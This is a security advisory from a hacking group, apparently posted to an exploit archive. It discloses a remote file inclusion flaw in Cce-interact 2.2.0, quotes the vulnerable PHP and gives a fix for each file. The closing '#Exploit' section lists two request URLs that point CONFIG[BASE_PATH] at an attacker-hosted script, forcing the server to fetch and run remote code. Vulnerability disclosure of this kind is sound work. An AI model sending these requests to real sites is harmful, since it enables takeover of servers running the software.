interact <= 2.2 (CONFIG[BASE_PATH]) Remote File Include Vulnerability
=====================================================================



/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- Cce-interact <= 2.2.0 (CONFIG[BASE_PATH]) Remote File Include Vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- [Script name: Interact - Online Learning and Collaboration System v. 2.2.0
- [Script site: https://sourceforge.net/projects/cce-interact/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-          Find by: Kacper (a.k.a Rahim)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- Special Greetz: DragonHeart ;-)
- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi
-
!@ Przyjazni nie da sie zamienic na marne korzysci @!
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-            Z Dedykacja dla osoby,
-         bez ktorej nie mogl bym zyc...
-           K.C:* J.M (a.k.a Magaja)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
/*
+++++++++++++++++++++START+++++++++++++++++++++++
vulnerable code => admin/autoprompter.php line 33-38:
....

require_once($CONFIG[&#039;BASE_PATH&#039;].&#039;/modules/forum/autoprompt/prompt.inc.php&#039;);
require_once($CONFIG[&#039;LANGUAGE_CPATH&#039;].&#039;/forum_strings.inc.php&#039;);

$rs = $CONN->Execute("SELECT {$CONFIG[&#039;DB_PREFIX&#039;]}posts.post_key,
{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.SpaceKey,
{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.GroupKey,
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.NumberToPrompt,
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.subject,
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.body,{$CONFIG[&#039;DB_PREFIX&#039;]}posts.module_key,{$CONFIG[&#039;DB_PREFIX&#039;]}posts.thread_key,{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.MinimumReplies,{$CONFIG[&#039;DB_PREFIX&#039;]}Spaces.Name,
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.added_by_key FROM
{$CONFIG[&#039;DB_PREFIX&#039;]}posts,{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks,{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement,{$CONFIG[&#039;DB_PREFIX&#039;]}Spaces
LEFT JOIN {$CONFIG[&#039;DB_PREFIX&#039;]}postsAutoPrompts ON
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.Postkey={$CONFIG[&#039;DB_PREFIX&#039;]}postsAutoPrompts.post_key
WHERE
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.PostKey={$CONFIG[&#039;DB_PREFIX&#039;]}posts.post_key
AND
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.module_key={$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.ModuleKey
AND
{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.SpaceKey={$CONFIG[&#039;DB_PREFIX&#039;]}Spaces.SpaceKey
AND
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.date_added<DATE_SUB(CURRENT_DATE,INTERVAL
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.DaysToWait DAY) AND
{$CONFIG[&#039;DB_PREFIX&#039;]}postsAutoPrompts.post_key IS NULL ORDER BY
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.post_key");

....
+++++++++++++++++++++FIX+++++++++++++++++++++++++
admin/autoprompter.php line 33-38:
....
require_once(&#039;../local/config.inc.php&#039;);
require_once($CONFIG[&#039;BASE_PATH&#039;].&#039;/modules/forum/autoprompt/prompt.inc.php&#039;);
require_once($CONFIG[&#039;LANGUAGE_CPATH&#039;].&#039;/forum_strings.inc.php&#039;);

$rs = $CONN->Execute("SELECT {$CONFIG[&#039;DB_PREFIX&#039;]}posts.post_key,
{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.SpaceKey,
{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.GroupKey,
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.NumberToPrompt,
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.subject,
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.body,{$CONFIG[&#039;DB_PREFIX&#039;]}posts.module_key,{$CONFIG[&#039;DB_PREFIX&#039;]}posts.thread_key,{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.MinimumReplies,{$CONFIG[&#039;DB_PREFIX&#039;]}Spaces.Name,
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.added_by_key FROM
{$CONFIG[&#039;DB_PREFIX&#039;]}posts,{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks,{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement,{$CONFIG[&#039;DB_PREFIX&#039;]}Spaces
LEFT JOIN {$CONFIG[&#039;DB_PREFIX&#039;]}postsAutoPrompts ON
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.Postkey={$CONFIG[&#039;DB_PREFIX&#039;]}postsAutoPrompts.post_key
WHERE
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.PostKey={$CONFIG[&#039;DB_PREFIX&#039;]}posts.post_key
AND
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.module_key={$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.ModuleKey
AND
{$CONFIG[&#039;DB_PREFIX&#039;]}ModuleSpaceLinks.SpaceKey={$CONFIG[&#039;DB_PREFIX&#039;]}Spaces.SpaceKey
AND
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.date_added<DATE_SUB(CURRENT_DATE,INTERVAL
{$CONFIG[&#039;DB_PREFIX&#039;]}ForumThreadManagement.DaysToWait DAY) AND
{$CONFIG[&#039;DB_PREFIX&#039;]}postsAutoPrompts.post_key IS NULL ORDER BY
{$CONFIG[&#039;DB_PREFIX&#039;]}posts.post_key");

....
+++++++++++++++++++++++++++++++++++++++++++++++++
vulnerable code => includes/common.inc.php line 35-40:
....

$CONFIG[&#039;ADODB_PATH&#039;]    = $CONFIG[&#039;BASE_PATH&#039;].&#039;/includes/adodb&#039;;
//Include database abstraction classes
require_once($CONFIG[&#039;ADODB_PATH&#039;].&#039;/adodb.inc.php&#039;);
require_once($CONFIG[&#039;ADODB_PATH&#039;].&#039;/session/adodb-session.php&#039;);

....
+++++++++++++++++++++FIX+++++++++++++++++++++++++
includes/common.inc.php line 35-40:
....

require_once(&#039;../local/config.inc.php&#039;);
$CONFIG[&#039;ADODB_PATH&#039;]    = $CONFIG[&#039;BASE_PATH&#039;].&#039;/includes/adodb&#039;;
//Include database abstraction classes
require_once($CONFIG[&#039;ADODB_PATH&#039;].&#039;/adodb.inc.php&#039;);
require_once($CONFIG[&#039;ADODB_PATH&#039;].&#039;/session/adodb-session.php&#039;);

....
++++++++++++++++++++THE+END++++++++++++++++++++++
*/
#Exploit:

http://www.site.com/[Cce-interact_path]/admin/autoprompter.php?CONFIG[BASE_PATH]=[http://www.myevilsite.com/evil_scripts.txt]

http://www.site.com/[Cce-interact_path]/includes/common.inc.php?CONFIG[BASE_PATH]=[http://www.myevilsite.com/evil_scripts.txt]




